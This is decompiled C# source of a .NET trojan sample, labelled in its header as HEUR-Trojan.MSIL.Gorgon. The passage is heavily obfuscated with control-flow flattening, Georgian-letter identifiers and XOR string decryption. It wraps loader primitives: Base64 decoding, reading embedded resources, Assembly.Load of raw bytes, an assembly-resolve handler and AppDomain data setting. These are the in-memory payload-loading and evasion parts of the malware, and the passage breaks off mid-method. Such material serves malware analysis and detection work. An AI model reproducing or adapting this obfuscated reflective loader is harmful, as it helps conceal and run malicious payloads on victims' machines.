// Decompiled with JetBrains decompiler
// Type: ႷႠ
// Assembly: xU, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 15FBACA6-4EA1-48EF-94B8-EDBEAA61F9E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-c4129b34223aa76d82149dfb9d96165a2c415edb79c4eb534239035bd98047de.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Configuration;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Text;
using System.Threading;
using xU.My;
using Ⴓ;

internal sealed class ႷႠ
{
  [SecuritySafeCritical]
  internal static AppDomain Ⴅ([In] char obj0, [In] int obj1)
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴅ[48] / 6;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 1:
        case 5:
          goto label_12;
        case 2:
        case 7:
          obj = (object) AppDomain.CurrentDomain;
          num2 = 6;
          continue;
        case 3:
        case 4:
          goto label_3;
        case 6:
          ++num1;
          int num3 = (int) obj0;
          num2 = (num3 * num3 + (int) obj0) % 2 == 0 ? (int) ⴅ[6] - 132 : 11;
          continue;
        case 8:
          obj = (object) null;
          num2 = 6;
          continue;
        case 9:
          int num4;
          switch ((obj1 ^ (int) obj0) - 18 ^ num1)
          {
            case 0:
              num4 = 7;
              break;
            default:
              num4 = (int) ⴃ[219] - 37286;
              break;
          }
          num2 = num4;
          continue;
        case 10:
          num2 = (int) ⴅ[39] * 3;
          continue;
        case 11:
          num2 = 9;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴅ);
          num2 = (int) ⴃ[429] - 29712;
          continue;
      }
    }
label_12:
    return obj as AppDomain;
  }

  [SecuritySafeCritical]
  internal static string Ⴓ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] string[] obj1, [In] int obj2, [In] short obj3) where \u0021\u00210 : string
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 5;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 5;
          continue;
        case 1:
          obj = (object) null;
          num2 = 2;
          continue;
        case 2:
          ++num1;
          num3 = 227;
          goto case 8;
        case 3:
          goto label_13;
        case 4:
          num2 = 5;
          continue;
        case 5:
        case 10:
          int num4;
          switch ((obj2 ^ (int) obj3) - 105 ^ num1)
          {
            case 0:
              num4 = 7;
              break;
            default:
              num4 = (int) ⴅ[59] - 217;
              break;
          }
          num2 = num4;
          continue;
        case 6:
        case 7:
          obj = (object) Utils.GetResourceString((string) obj0, obj1);
          num2 = 2;
          continue;
        case 8:
          num2 = 3222 > 358 - num3 * 9 ? 3 : 0;
          continue;
        case 9:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴓ);
          num2 = 9;
          continue;
      }
    }
label_13:
    return (string) obj;
  }

  [SecuritySafeCritical]
  internal static byte[] Ⴄ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] int obj2) where \u0021\u00210 : string
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 8;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          ++num1;
          num2 = 389 < 1556 / 4 - 128 ? (int) ⴅ[177] - 3 : 3;
          continue;
        case 1:
        case 4:
        case 10:
          obj = (object) Convert.FromBase64String((string) obj0);
          num2 = 0;
          continue;
        case 3:
        case 5:
          goto label_11;
        case 6:
          obj = (object) null;
          num2 = 0;
          continue;
        case 7:
          goto label_3;
        case 8:
          int num3;
          switch ((obj2 ^ (int) obj1) - 65 ^ num1)
          {
            case 0:
              num3 = (int) ⴃ[313] - 38397;
              break;
            default:
              num3 = (int) ⴃ[267] - 14690;
              break;
          }
          num2 = num3;
          continue;
        case 9:
          num2 = 8;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴄ);
          num2 = 7;
          continue;
      }
    }
label_11:
    return obj as byte[];
  }

  [SecuritySafeCritical]
  internal static double Ⴀ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : string
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 6;
    double num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 6;
          continue;
        case 1:
        case 9:
          num3 = 0.051827777446478623;
          goto case 5;
        case 4:
          ++num1;
          num2 = 7140 > 714 - 140 * 10 ? (int) ⴅ[113] - 126 : 10;
          continue;
        case 5:
          num2 = (int) ⴅ[107] - 204;
          continue;
        case 6:
          int num4;
          switch (((int) obj1 ^ (int) obj2) - 81 ^ num1)
          {
            case 0:
              num4 = 8;
              break;
            default:
              num4 = (int) ⴃ[219] - 37293;
              break;
          }
          num2 = num4;
          continue;
        case 7:
          goto label_3;
        case 8:
          num3 = Conversions.ToDouble((string) obj0);
          num2 = 4;
          continue;
        case 10:
          num2 = (int) ⴅ[51] - (int) ⴅ[56];
          continue;
        case 11:
          goto label_13;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴀ);
          num2 = 7;
          continue;
      }
    }
label_13:
    return num3;
  }

  [SecuritySafeCritical]
  internal static void Ⴗ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] short obj2) where \u0021\u00210 : object
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
    int num1 = 4;
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 1:
          num1 = 2;
          continue;
        case 2:
          ++num2;
          num3 = 658;
          goto case 5;
        case 3:
          int num4;
          switch (((int) obj2 ^ (int) obj1) - 12 ^ num2)
          {
            case 0:
              num4 = 7;
              break;
            case 1:
              num4 = 9;
              break;
            default:
              num4 = (int) ⴃ[169] - 15285;
              break;
          }
          num1 = num4;
          continue;
        case 5:
          int num5 = 19;
          num1 = 329 < num3 / 2 - num5 ? 3 : (int) ⴅ[49] - 100;
          continue;
        case 6:
          num1 = (int) ⴅ[3] - 172;
          continue;
        case 7:
          Monitor.Enter((object) obj0);
          goto case 6;
        case 8:
          goto label_14;
        case 9:
          Monitor.Exit((object) obj0);
          goto case 2;
        default:
          num2 = 0;
          num1 = 3;
          continue;
      }
    }
label_14:;
  }

  [SecuritySafeCritical]
  internal static void Ⴈ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : Exception
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
    int num1 = 0;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 1:
          goto label_12;
        case 2:
          num1 = 4;
          continue;
        case 3:
          goto label_13;
        case 4:
          int num3;
          switch (((int) obj2 ^ (int) obj1) - 56 ^ num2)
          {
            case 0:
              num3 = 6;
              break;
            default:
              num3 = 8;
              break;
          }
          num1 = num3;
          continue;
        case 5:
          int num4 = (int) obj1;
          num1 = (num4 * num4 + (int) obj1) % 2 == 0 ? (int) ⴅ[229] - 218 : (int) ⴅ[88] - 108;
          continue;
        case 6:
        case 7:
          ProjectData.SetProjectError((Exception) obj0);
          goto case 9;
        case 8:
          num1 = 9;
          continue;
        case 9:
          ++num2;
          goto case 5;
        default:
          num2 = 0;
          num1 = 4;
          continue;
      }
    }
label_12:
    return;
label_13:;
  }

  [SecuritySafeCritical]
  internal static string[] Ⴍ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] char obj2) where \u0021\u00210 : Assembly
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[415] - 47699;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 9;
          continue;
        case 3:
          int num3;
          switch ((obj1 ^ (int) obj2) - 11 ^ num1)
          {
            case 0:
              num3 = 5;
              break;
            default:
              num3 = (int) ⴃ[78] - 46584;
              break;
          }
          num2 = num3;
          continue;
        case 4:
          num2 = 3;
          continue;
        case 5:
          obj = (object) obj0.GetManifestResourceNames();
          num2 = 9;
          continue;
        case 6:
          obj = (object) null;
          goto case 0;
        case 7:
          num2 = (int) ⴅ[137] - 38;
          continue;
        case 8:
          goto label_14;
        case 9:
          ++num1;
          goto case 10;
        case 10:
          num2 = 340 > 85 - 14 * 4 ? 8 : 7;
          continue;
        case 11:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴍ);
          num2 = 11;
          continue;
      }
    }
label_14:
    return (string[]) obj;
  }

  [SecuritySafeCritical]
  internal static char Ⴐ([In] int obj0, [In] char obj1, [In] char obj2)
  {
    char[] ⴃ = MyApplication.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = 3;
    char ch;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 11:
          ch = obj2;
          num2 = 2;
          continue;
        case 1:
          num2 = 3;
          continue;
        case 2:
          ++num1;
          goto case 9;
        case 3:
        case 4:
          int num3;
          switch (((int) obj1 ^ (int) obj2) - 36 ^ num1)
          {
            case 0:
              num3 = 5;
              break;
            default:
              num3 = 11;
              break;
          }
          num2 = num3;
          continue;
        case 5:
          ch = Strings.Chr(obj0);
          num2 = (int) ⴃ[54] - 45478;
          continue;
        case 6:
          num2 = 3;
          continue;
        case 8:
          goto label_3;
        case 9:
          num2 = 5952 > 992 - 13 * 6 ? 10 : 6;
          continue;
        case 10:
          goto label_13;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴐ);
          num2 = 8;
          continue;
      }
    }
label_13:
    return ch;
  }

  [SecuritySafeCritical]
  internal static bool Ⴃ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] int obj2,
    [In] char obj3)
    where \u0021\u00210 : object
    where \u0021\u00211 : object
  {
    char[] ⴃ = MyApplication.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[373] - 30847;
    bool flag;
    while (true)
    {
      switch (num2)
      {
        case 0:
          goto label_12;
        case 1:
        case 8:
          flag = object.ReferenceEquals((object) obj0, (object) obj1);
          num2 = 10;
          continue;
        case 2:
        case 3:
          int num3;
          switch ((obj2 ^ (int) obj3) - 100 ^ num1)
          {
            case 0:
              num3 = 1;
              break;
            default:
              num3 = 7;
              break;
          }
          num2 = num3;
          continue;
        case 4:
          num2 = (int) ⴃ[140] - 52013;
          continue;
        case 5:
          goto label_3;
        case 7:
          flag = true;
          goto case 9;
        case 9:
          num2 = (int) ⴃ[20] - 10520;
          continue;
        case 10:
          ++num1;
          num2 = 935 < 3740 / 4 - 104 ? 3 : 0;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴃ);
          num2 = 5;
          continue;
      }
    }
label_12:
    return flag;
  }

  [SecuritySafeCritical]
  internal static bool Ⴜ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] short obj2,
    [In] short obj3)
    where \u0021\u00210 : object
    where \u0021\u00211 : Hashtable
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
    char[] ⴃ = MyApplication.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[362] - (int) ⴃ[362];
    bool flag;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 6:
          int num3;
          switch (((int) obj3 ^ (int) obj2) - 68 ^ num1)
          {
            case 0:
              num3 = 11;
              break;
            default:
              num3 = (int) ⴅ[28];
              break;
          }
          num2 = num3;
          continue;
        case 1:
        case 9:
          goto label_3;
        case 2:
          num2 = 0;
          continue;
        case 3:
          num2 = (int) ⴅ[35] - (int) ⴅ[35];
          continue;
        case 4:
        case 8:
          flag = true;
          num2 = 10;
          continue;
        case 7:
          goto label_12;
        case 10:
          ++num1;
          int num4 = (int) obj3;
          num2 = (num4 * num4 + (int) obj3) % 2 == 0 ? (int) ⴅ[184] - (int) ⴅ[11] : 3;
          continue;
        case 11:
          flag = obj0.ContainsKey((object) obj1);
          num2 = 10;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.Ⴜ);
          num2 = (int) ⴅ[64] - 34;
          continue;
      }
    }
label_12:
    return flag;
  }

  [SecuritySafeCritical]
  internal static Exception ႳႥ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] int obj2) where \u0021\u00210 : Exception
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 5;
    object obj;
    int num3;
    int num4;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 5;
          continue;
        case 1:
        case 6:
          obj = (object) obj0.InnerException;
          num2 = (int) ⴅ[225] / 8;
          continue;
        case 2:
          ++num1;
          num3 = 2847;
          goto case 3;
        case 3:
          num4 = 217;
          goto case 4;
        case 4:
          num2 = 949 < num3 / 3 - num4 ? (int) ⴃ[57] - 7371 : 10;
          continue;
        case 5:
          int num5;
          switch (((int) obj1 ^ obj2) - 7 ^ num1)
          {
            case 0:
              num5 = 6;
              break;
            default:
              num5 = 7;
              break;
          }
          num2 = num5;
          continue;
        case 7:
          obj = (object) null;
          num2 = (int) ⴃ[95] - 26479;
          continue;
        case 8:
          goto label_3;
        case 10:
          goto label_13;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႳႥ);
          num2 = 8;
          continue;
      }
    }
label_13:
    return (Exception) obj;
  }

  internal sealed class ႷႤ
  {
    private static readonly Array Ⴅ;
    private static readonly Array Ⴀ;
    private static readonly object Ⴐ;
    internal static ႷႠ.ႷႤ.Ⴍ Ⴃ;

    [SecuritySafeCritical]
    internal static Assembly Ⴓ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] SecurityContextSource obj2,
      [In] int obj3,
      [In] char obj4)
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = 10;
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 4:
            obj = (object) Assembly.Load(obj0, obj1, obj2);
            num2 = 6;
            continue;
          case 2:
            num2 = 10;
            continue;
          case 3:
          case 5:
            obj = (object) null;
            num2 = 6;
            continue;
          case 6:
            ++num1;
            num2 = 739 < 2217 / 3 - 258 ? 10 : (int) ⴅ[59] - (int) ⴅ[60];
            continue;
          case 7:
          case 10:
            int num3;
            switch ((obj3 ^ (int) obj4) - 52 ^ num1)
            {
              case 0:
                num3 = (int) ⴃ[118] - 24549;
                break;
              default:
                num3 = (int) ⴅ[125] / 8;
                break;
            }
            num2 = num3;
            continue;
          case 8:
            goto label_11;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.Ⴓ);
            num2 = 0;
            continue;
        }
      }
label_11:
      return (Assembly) obj;
    }

    internal static string Ⴗ([In] int obj0, [In] Assembly obj1, [In] int obj2)
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ1 = ႠႤ.Ⴅ;
label_3:
      int index1 = obj2 ^ 1675135208 ^ obj0;
      object ⴀ = (object) ႷႠ.ႷႤ.Ⴀ;
label_4:
      char[] chArray1 = (char[]) ⴀ;
      int num1 = (int) chArray1[index1];
      int index2 = (int) chArray1[index1 + 2] ^ num1;
      int num2 = 11;
      IEnumerable enumerable;
      int index3;
      Array array1;
      Array array2;
      object obj;
      char ch;
      int num3;
      int num4;
      int length;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_6;
          case 1:
          case 17:
            char[] chArray2 = (char[]) ⴀ;
            char[] ⴅ2 = (char[]) ႷႠ.ႷႤ.Ⴅ;
            index3 = index1;
            array1 = (Array) ⴅ2;
            array2 = (Array) chArray2;
            num2 = 14;
            continue;
          case 2:
            (obj as StringBuilder).Append((char) ((uint) ch ^ (uint) ((char[]) array2)[index3 + num4 - num5] ^ (uint) (array1 as char[])[(num5 + index3 + 17) % length]));
            num2 = 8;
            continue;
          case 4:
            num4 = num4 << 15 | (int) (array2 as char[])[index3++] ^ (int) ch;
            num2 = 15;
            continue;
          case 5:
            index3 += 3;
            num4 = num3 & 31 | (num3 & 65472) >> 1;
            num2 = (int) ⴅ1[206] - 27;
            continue;
          case 6:
            goto label_18;
          case 7:
            goto label_4;
          case 8:
            ++num5;
            num2 = (int) ⴃ[159] - 5336;
            continue;
          case 9:
            num2 = num5 <= num4 ? 2 : (int) ⴅ1[87];
            continue;
          case 10:
            enumerable = (IEnumerable) ((StringBuilder) obj).ToString();
            ((string[]) ႷႠ.ႷႤ.Ⴐ)[index2] = enumerable as string;
            num2 = 6;
            continue;
          case 11:
            num2 = (string) (enumerable = (IEnumerable) ((string[]) ႷႠ.ႷႤ.Ⴐ)[index2]) == null ? (int) ⴃ[92] - 10208 : 0;
            continue;
          case 12:
            num2 = (int) ⴃ[157] - 46681;
            continue;
          case 13:
            num2 = (num3 & 32) == 0 ? 15 : (int) ⴃ[322] - 40962;
            continue;
          case 14:
            obj = (object) new StringBuilder();
            ch = ((char[]) array2)[index3];
            num3 = (int) ((char[]) array2)[index3 + 1] ^ (int) ch;
            num2 = (int) ⴅ1[125] / 8;
            continue;
          case 15:
            length = (array1 as char[]).Length;
            num5 = 1;
            goto case 12;
          case 16:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.Ⴗ);
            num2 = 16;
            continue;
        }
      }
label_6:
      return (string) enumerable;
label_18:
      return enumerable as string;
    }

    [SecuritySafeCritical]
    internal static StringBuilder Ⴈ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] char obj1,
      [In] int obj2,
      [In] short obj3)
      where \u0021\u00210 : StringBuilder
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴃ[82] - 16997;
      ISerializable serializable;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num3;
            switch (((int) obj3 ^ obj2) - 66 ^ num1)
            {
              case 0:
                num3 = (int) ⴃ[215] - 10080;
                break;
              default:
                num3 = (int) ⴅ[87];
                break;
            }
            num2 = num3;
            continue;
          case 1:
            num2 = (int) ⴃ[284] - 36477;
            continue;
          case 2:
          case 7:
            goto label_3;
          case 3:
          case 9:
            serializable = (ISerializable) obj0.Append(obj1);
            num2 = (int) ⴃ[85] - 40454;
            continue;
          case 4:
            int num4 = num1;
            MyApplication.Ⴃ[179] = (char) (((int) MyApplication.Ⴃ[179] | obj2) & 232);
            num1 = num4 + 1;
            int num5 = (int) obj3;
            num2 = (num5 * num5 + (int) obj3) % 2 == 0 ? (int) ⴅ[232] - (int) ⴅ[225] : (int) ⴅ[53] - (int) ⴅ[64];
            continue;
          case 5:
            goto label_12;
          case 6:
            num2 = 0;
            continue;
          case 10:
            serializable = (ISerializable) null;
            num2 = (int) ⴅ[28];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.Ⴈ);
            num2 = (int) ⴃ[26] - 51681;
            continue;
        }
      }
label_12:
      return serializable as StringBuilder;
    }

    [SecuritySafeCritical]
    internal static Assembly Ⴄ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] char obj2) where \u0021\u00210 : ResolveEventArgs
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴅ[83] - 145;
      IEvidenceFactory evidenceFactory;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 4:
            evidenceFactory = (IEvidenceFactory) obj0.RequestingAssembly;
            num2 = 10;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 7:
            num2 = (int) ⴅ[151] - 125;
            continue;
          case 5:
            int num3;
            switch (((int) obj2 ^ obj1) - 84 ^ num1)
            {
              case 0:
                num3 = 0;
                break;
              default:
                num3 = (int) ⴅ[73] - 193;
                break;
            }
            num2 = num3;
            continue;
          case 6:
            goto label_12;
          case 9:
            num2 = (int) ⴃ[136] - 5481;
            continue;
          case 10:
            ++num1;
            int num4 = 858 - 87 * 5;
            ႠႤ.Ⴅ[155] = (byte) ((int) ႠႤ.Ⴅ[155] + obj1 & 173);
            num2 = 4290 > num4 ? 6 : 9;
            continue;
          case 11:
            evidenceFactory = (IEvidenceFactory) null;
            num2 = (int) ⴅ[87];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.Ⴄ);
            num2 = 1;
            continue;
        }
      }
label_12:
      return (Assembly) evidenceFactory;
    }

    [SecuritySafeCritical]
    internal static string Ⴜ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00211 obj0,
      [In] \u0021\u00210 obj1,
      [In] short obj2,
      [In] char obj3)
      where \u0021\u00210 : string
      where \u0021\u00211 : string
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      int num1 = 0;
      int num2 = 6;
      IConvertible convertible;
      while (true)
      {
        switch (num2)
        {
          case 1:
            convertible = (IConvertible) null;
            goto case 10;
          case 3:
            ++num1;
            num2 = 358 < 1432 / 4 - 155 ? 6 : (int) ⴅ[28];
            continue;
          case 4:
          case 7:
            goto label_12;
          case 5:
            convertible = (IConvertible) ((string) obj0 + (string) obj1);
            num2 = 3;
            continue;
          case 6:
            int num3;
            switch (((int) obj3 ^ (int) obj2) - 76 ^ num1)
            {
              case 0:
                num3 = 5;
                break;
              default:
                num3 = (int) ⴃ[433] - 34763;
                break;
            }
            num2 = num3;
            continue;
          case 8:
            goto label_3;
          case 9:
            num2 = 6;
            continue;
          case 10:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.Ⴜ);
            num2 = 8;
            continue;
        }
      }
label_12:
      return (string) convertible;
    }

    [SecuritySafeCritical]
    internal static byte[] ႷႳ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : MemoryStream
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴅ[70] - (int) ⴅ[233];
      object obj;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 9:
            goto label_3;
          case 2:
          case 5:
            goto label_13;
          case 3:
            obj = (object) obj0.ToArray();
            num2 = 4;
            continue;
          case 4:
            ++num1;
            goto case 8;
          case 6:
            obj = (object) null;
            num2 = (int) ⴅ[28];
            continue;
          case 7:
            int num4;
            switch ((obj1 ^ (int) obj2) - 5 ^ num1)
            {
              case 0:
                num4 = 3;
                break;
              default:
                num4 = (int) ⴅ[196] - 158;
                break;
            }
            num2 = num4;
            continue;
          case 8:
            int num5 = (int) obj2;
            int num6 = num5 * num5;
            num3 = (int) obj2 + num6;
            num2 = (int) ⴅ[87];
            continue;
          case 10:
            num2 = num3 % 2 != 0 ? (int) ⴃ[114] - 49257 : 2;
            continue;
          case 11:
            num2 = (int) ⴃ[192] - 38041;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.ႷႳ);
            num2 = 9;
            continue;
        }
      }
label_13:
      return obj as byte[];
    }

    [SecuritySafeCritical]
    internal static void ႷႷ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00211 obj0,
      [In] \u0021\u00210 obj1,
      [In] \u0021\u00212 obj2,
      [In] int obj3,
      [In] short obj4)
      where \u0021\u00210 : string
      where \u0021\u00211 : AppDomain
      where \u0021\u00212 : object
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
      int num1 = 7;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            int num3;
            switch (((int) obj4 ^ obj3) - (int) sbyte.MaxValue ^ num2)
            {
              case 0:
                num3 = 6;
                break;
              default:
                num3 = 3;
                break;
            }
            num1 = num3;
            continue;
          case 1:
          case 4:
          case 5:
            ++num2;
            goto case 9;
          case 2:
            num1 = 0;
            continue;
          case 3:
            num1 = (int) ⴅ[219] - 78;
            continue;
          case 6:
            obj0.SetData((string) obj1, (object) obj2);
            goto case 1;
          case 8:
            goto label_12;
          case 9:
            int num4 = (int) obj4;
            num1 = (num4 * num4 + (int) obj4) % 2 == 0 ? 8 : (int) ⴅ[19] - 125;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴃ[10] - 61484;
            continue;
        }
      }
label_12:;
    }

    [SecuritySafeCritical]
    internal static SettingsBase ႷႥ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] char obj1,
      [In] char obj2)
      where \u0021\u00210 : SettingsBase
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴅ[115] - 39;
      object obj;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_14;
          case 1:
          case 3:
            num2 = 11;
            continue;
          case 2:
            obj = (object) SettingsBase.Synchronized((SettingsBase) obj0);
            num2 = (int) ⴅ[159] - 92;
            continue;
          case 4:
            num2 = (int) ⴅ[221] - 248;
            continue;
          case 5:
            num2 = num3 % 2 != 0 ? 11 : (int) ⴅ[70] - (int) ⴅ[70];
            continue;
          case 6:
            ++num1;
            goto case 9;
          case 7:
            goto label_3;
          case 9:
            int num4 = (int) obj1;
            int num5 = num4 * num4;
            num3 = (int) obj1 + num5;
            num2 = 5;
            continue;
          case 10:
            obj = (object) null;
            goto case 4;
          case 11:
            int num6;
            switch (((int) obj2 ^ (int) obj1) - 79 ^ num1)
            {
              case 0:
                num6 = 2;
                break;
              default:
                num6 = 10;
                break;
            }
            num2 = num6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.ႷႥ);
            num2 = (int) ⴃ[143] - 64461;
            continue;
        }
      }
label_14:
      return (SettingsBase) obj;
    }

    [SecuritySafeCritical]
    internal static Assembly ႷႠ([In] short obj0, [In] char obj1)
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴃ[309] - 37999;
      ISerializable serializable;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            serializable = (ISerializable) Assembly.GetExecutingAssembly();
            num2 = (int) ⴅ[190] - 177;
            continue;
          case 1:
            int num4;
            switch (((int) obj1 ^ (int) obj0) - 121 ^ num1)
            {
              case 0:
                num4 = 3;
                break;
              default:
                num4 = (int) ⴅ[83] - 140;
                break;
            }
            num2 = num4;
            continue;
          case 2:
            ++num1;
            int num5 = (int) obj1;
            int num6 = num5 * num5;
            num3 = (int) obj1 + num6;
            num2 = 6;
            continue;
          case 4:
            goto label_3;
          case 6:
          case 11:
            num2 = num3 % 2 != 0 ? 1 : 8;
            continue;
          case 7:
            num2 = (int) ⴅ[186] - 137;
            continue;
          case 8:
            goto label_12;
          case 10:
            serializable = (ISerializable) null;
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.ႷႠ);
            num2 = 4;
            continue;
        }
      }
label_12:
      return serializable as Assembly;
    }

    [SecuritySafeCritical]
    internal static double ႷႰ([In] double obj0, [In] int obj1, [In] char obj2)
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      int num1 = 0;
      int num2 = 0;
      double num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num5;
            switch ((obj1 ^ (int) obj2) - 29 ^ num1)
            {
              case 0:
                num5 = (int) ⴅ[221] - 249;
                break;
              default:
                int num6 = (int) ⴃ[49];
                ႠႤ.Ⴅ[92] = (byte) ((int) ႠႤ.Ⴅ[92] * obj1 & 250);
                num5 = num6 - 62103;
                break;
            }
            num2 = num5;
            continue;
          case 1:
          case 2:
            num2 = 0;
            continue;
          case 4:
            num3 = 0.39233991813775421;
            num2 = 11;
            continue;
          case 5:
            num3 = Math.Round(obj0);
            num2 = 11;
            continue;
          case 6:
            num2 = num4 % 2 != 0 ? 0 : 7;
            continue;
          case 7:
            goto label_13;
          case 8:
            num2 = (int) ⴃ[42] - 32906;
            continue;
          case 9:
            goto label_3;
          case 11:
            ++num1;
            int num7 = (int) obj2;
            int num8 = num7 * num7;
            num4 = (int) obj2 + num8;
            goto case 8;
          default:
            // ISSUE: method reference
